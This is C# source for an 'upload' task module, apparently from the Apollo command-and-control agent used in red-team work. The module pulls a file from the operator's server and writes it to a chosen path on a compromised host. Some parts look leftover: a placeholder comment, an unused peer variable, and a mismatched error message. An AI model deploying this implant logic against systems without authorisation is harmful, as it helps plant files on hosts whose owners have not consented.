using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using ApolloInterop.Serializers;
using System.Threading;

namespace Tasks
{
    public class upload : Tasking
    {
        [DataContract]
        internal struct UploadParameters
        {
            [DataMember(Name = "remote_path")]
            internal string RemotePath;
            [DataMember(Name = "file")]
            internal string FileID;
            [DataMember(Name = "file_name")]
            internal string FileName;
            [DataMember(Name = "host")]
            internal string HostName;
        }

        public upload(IAgent agent, Task task) : base(agent, task)
        {

        }

        public override void Kill()
        {
            throw new NotImplementedException();
        }

        public override System.Threading.Tasks.Task CreateTasking()
        {
            return new System.Threading.Tasks.Task(() =>
            {
                TaskResponse resp;
                ApolloInterop.Classes.P2P.Peer p = null;
                try
                {
                    UploadParameters parameters = _jsonSerializer.Deserialize<UploadParameters>(_data.Parameters);
                    // some additional upload logic
                    if (_agent.GetFileManager().GetFile(
                        _cancellationToken.Token,
                        _data.ID,
                        parameters.FileID,
                        out byte[] fileData))
                    {
                        System.IO.File.WriteAllBytes(parameters.RemotePath, fileData);
                        resp = CreateTaskResponse(
                            $"Uploaded file to {parameters.RemotePath}",
                            true,
                            "completed");
                    } else
                    {
                        resp = CreateTaskResponse($"Failed to fetch file.", true, "error");
                    }
                }
                catch (Exception ex)
                {
                    resp = CreateTaskResponse(
                        $"{ex.StackTrace}\n\nFailed to establish connection. Reason: {ex.Message}",
                        true,
                        "error");
                    if (p != null)
                    {
                        _agent.GetPeerManager().Remove(p);
                    }
                    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                }
            }, _cancellationToken.Token);
        }
    }
}
